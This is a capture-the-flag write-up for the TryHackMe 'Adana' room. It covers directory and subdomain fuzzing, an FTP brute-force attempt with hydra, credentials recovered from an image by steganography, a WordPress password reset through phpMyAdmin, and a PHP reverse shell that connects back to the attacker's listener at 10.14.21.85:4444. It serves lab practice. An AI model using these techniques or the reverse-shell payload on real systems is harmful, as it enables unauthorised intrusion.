Adana
-----
Link: https://tryhackme.com/room/adana

Description
```
﻿Hello there
We will tend to think differently in this room.
In fact, we will understand that what we see is not what we think, and if you go beyond the purpose, you will disappear in the room, fall into a rabbit hole.﻿
```

When trying to navigate to the wp-admin page in firefox we are redirected to
this page: http://adana.thm/wp-login.php?redirect_to=http%3A%2F%2F10.10.32.11%2Fwp-admin%2F&reauth=1

and firefox cant find the site. Lets add adana.thm to the hosts file.

That works better.

Scanning it with ffuf reveals a few directories:
```
$ ffuf -u http://adana.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://adana.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 4020ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 5126ms]
announcements           [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 97ms]
javascript              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 157ms]
phpmyadmin              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 76ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 86ms]
wp-admin                [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 77ms]
wp-content              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 55ms]
wp-includes             [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 70ms]
:: Progress: [20476/20476] :: Job [1/1] :: 587 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
```

If we go to http://adana.thm/announcements/, we can see two files:
[IMG]	austrailian-bulldog-ant.jpg	2021-01-11 11:51 	58K
[TXT]	wordlist.txt	2021-01-11 13:48 	394K

Let's download them and see if we find anything interesting.
wordlists.txt looks like a list of possible passwords.
We could try to hydra our way into the FTP server, although we don't have any
username. We could guess that it is "adana".

No dice.
```
$ hydra -l adana -P website/wordlist.txt adana.thm ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-21 18:42:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50000 login tries (l:1/p:50000), ~3125 tries per task
[DATA] attacking ftp://adana.thm:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-21 18:42:13
```

## Finding secrets in the image
Let's try if we can do some steganography on the JPG-file we downloaded.
For this we can use stegseek:
```
$ stegseek austrailian-bulldog-ant.jpg ./wordlist.txt extracted_stegseek
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "extracted_stegseek".
```

Looks like we found something:
```
$ cat extracted_stegseek
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
```

## Poking around the FTP server
Looks like a base64-encoded string, what do we get if we decode it?
```
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

Now we can login via ftp:
```
$ lftp adana.thm -u hakanftp
Password:
lftp hakanftp@adana.thm:~>
```

By the looks of the files in the directory, it looks like the wordpress-site.
However, if I try to upload a file to it, for example test.php, it 404:s.

So I don't think this is the website that is displayed.

The wp-settings.php file looks a bit odd:
```
lftp hakanftp@adana.thm:/> ls
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001           13 Aug 21 19:09 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rwxrwxrwx    1 1001     1001           62 Aug 21 19:06 test.php
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
```

I would compare it to a known good wordpress install, but I don't have one
readily available and don't have the energy to install one. It looks like it is
owned by root.

## Down the rabbit hole
It contains defines of DB_USER and DB_PASSWORD which can be used to login to
http://adana.thm/phpmyadmin:
```
/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

```

It feels almost like too easy to be true, and reading the description of the room
it feels eerily suspicious.

Looking around the phpmyadmin-page, we find two databases. phpmyadmin and
phpmyadmin1. In the wp_posts table we can find the post on adana.thm:

phpmyadmin:
```
<!-- wp:paragraph -->
<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>
<!-- /wp:paragraph -->
```

phpmyadmin1:
```
<!-- wp:paragraph -->
<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing! HAKANBEY</p>
<!-- /wp:paragraph -->
```
I wonder if HAKANBEY can be a clue.

When I changed the text of the first entry in phpmyadmin/wp_posts the text on
adana.thm changes. Lets see if we can get a reverse shell by inserting php-code
somewhere.

Trying to embed php-code into posts or comments doesn't work. The ideal would
be if we could get access to the admin page somehow.

In the phpmyadmin/wp_users, we find an interesting line:
```
1 	hakanbey01 	$P$BQML2QxAFBH4hb.qqKTpDnta6Q6Wl2/ 	hakanbey01 	hakanbey01@thm.com 	http://asd.thm 	2021-01-10 23:07:29 		0 	hakanbey01
```
The corresponding line in phpmyadmin1/wp_users:
```
1 	hakanbey01 	$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh. 	hakanbey01 	hakanbey01@thm.com 	http://asd.thm 	2021-01-10 23:07:29 		0 	hakanbey01
```

I wonder where http://asd.thm leads us? We'll add it to /etc/hosts and see.
It leads to the exact same page. It could be that I don't quite understand
how vhosts work.

We can now simply change the password using phpmyadmin, so lets generate a
hash for the password "password", so we can log in to wordpress with the following
credentials.
hakanbey01:password (hash: $P$BUxwQ9E6ZkxqCIcCmzPwTtRktTl03u1)

It seems that we can access the admin interface. Here we can see that there are
two plugins installed. "Hello Dolly", and "Akismet Anti-spam".

Let's see if we can use Dolly to get a reverse shell. By using the plugin editor
we can add the following line to the Dolly plugin:
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.21.85/4444 0>&1'");
```

Although, our plan seems to be foiled by file permissions:
```
 You need to make this file writable before you can save your changes. See Changing File Permissions for more information.
```

We are able to use lftp to alter the permissions:
```
lftp hakanftp@adana.thm:/wp-content/plugins> chmod 777 hello.php
lftp hakanftp@adana.thm:/wp-content/plugins> ls
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 akismet
-rwxrwxrwx    1 1001     1001         2578 Mar 18  2019 hello.php
-rw-r--r--    1 1001     1001           28 Jun 05  2014 index.php
```
But this doesn't help, since I don't think the files we can access through the
ftp are the ones we can access through Firefox.

There is a way to get a reverse shell by replacing the 404.php code with a
reverse shell, but those files are not writeable either.

I'm starting to suspect this is the rabbit hole referenced in the room
description.

## Back out of the rabbit hole?
Let's refer back to one of the rooms questions:
What is the name of the secret directory?

So let's go back a few steps. I downloaded the JPG-file and the wordlist.txt
using a webbrowser. I should look and see if they are the same as the ones
accessible from the FTP server.

So lets repeat the steps from above.

Nope, they are the same.

We have some other opening:
Try enumerating hidden directories (ie directories starting with a dot (.))
See if there are any hidden directories on the ftp-server
Enumerate subdomains.

It's getting late, let's table this for another day.

Circling back to the ftp-server. If we ```ls -la``` we find some additional
interesting directories 
```
lftp hakanftp@adana.thm:/> ls -la
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 .
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 ..
-rw-------    1 1001     1001           88 Jan 13  2021 .bash_history
drwx------    2 1001     1001         4096 Jan 11  2021 .cache
drwx------    3 1001     1001         4096 Jan 11  2021 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10  2021 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
```

And we also find a .bash_history file.
```
lftp hakanftp@adana.thm:/> cat .bash_history
id
su root
ls
cd ..
ls
cd /home
ls
cd hakanbey/
ls
ls -la
cd ..
ls
exit
ls
cd /
ls
exit
```
So we are in a home-directory, and it looks like someone else have been poking
around. 

In the wp-options table in phpmyadmin1 we find that there is a line that reveals
a subdomain:
```
1 	siteurl 	http://subdomain.adana.thm 	yes
```

The corresponding entry in the phpmyadmin database is:
```
1 	siteurl 	http://adana.thm 	yes
```

My current theory, without having investigated further, is that the files we are
able to access via FTP are the ones that we can view via http://subdomain.adana.thm.

## Finding the subdomain: enumeration
We should be able to find this via sub-domain enumeration as well. This took a
bit of playing around, but here is what I find.

We can use ```ffuf``` for this:
```
$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.adana.thm" -u http://adana.thm
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://adana.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.adana.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

11                      [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 805ms]
aac                     [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 806ms]
17                      [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 806ms]
aaapi                   [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 807ms]
1                       [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 807ms]
a2                      [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 806ms]
a.auth-ns               [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 806ms]
aaaowa                  [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 807ms]
20                      [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 807ms]
10                      [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 807ms]
0                       [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 807ms]
a1                      [Status: 200, Size: 10846, Words: 459, Lines: 141, Duration: 890ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```
The issue here is quite obvious, that ffuf reports Status: 200 for every entry in
the wordlist. There is a way to get around this, and it is to filter out the
size 10846:
```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -H "Host: FUZZ.adana.thm" -fs 10846 -u http://adana.thm

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://adana.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.adana.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 10846
________________________________________________

subdomain               [Status: 200, Size: 11142, Words: 460, Lines: 140, Duration: 1236ms]
www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 508ms]
:: Progress: [20476/20476] :: Job [1/1] :: 126 req/sec :: Duration: [0:06:01] :: Errors: 0 ::
```
We now find subdomains that does not match the size 10846.

Although when we try to navigate to it, Firefox doesn't find the page, so lets
add it to /etc/hosts.

# Obtaining a reverse shell
We can now navigate to the http://subdomain.adana.thm, and it contains the post
that we found in the phpmyadmin1 database. Let's see if my theory regarding the
FTP server was correct.

So let's upload a file using ftp, and see if we can navigate to it.
Yup, uploading a test.html and making it readable (chmod 777 test.html) works,
and we are able to see the html page. So lets see if we can upload a reverse shell.
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.21.85/4444 0>&1'");?>

```
Uploading this as revshell.php and navigating to http://subdomain.adana.thm/revshell.php
does indeed get us a reverse shell:
```
$ nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.156.108.
Ncat: Connection from 10.10.156.108:48746.
bash: cannot set terminal process group (886): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/subdomain$
```

When trying to stabilize the shell, we notice something interesting:
```
www-data@ubuntu:/var/www/subdomain$ export $SHELL=bash
bash: export: `/usr/sbin/nologin=bash': not a valid identifier
```
It probably doesn't matter, but it's an interesting sidenote.

And now, for once, I manage to get a proper stable shell, with tab completion
and command history. The different is that this time I did
```
export $TERM=xterm # instead of xterm-256color
```
I can even use Ctrl-C! No more accidentally closing the shell.

By running ```id``` we get some info on who we are:
```
www-data@ubuntu:/var/www/subdomain$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And we find the webflag:
```
/var/www/html/wwe3bbfla4g.txt
```
Let's see if we also can find the secret directory the room is asking for, but
that, as well as the priv esc is a thing for tomorrow.
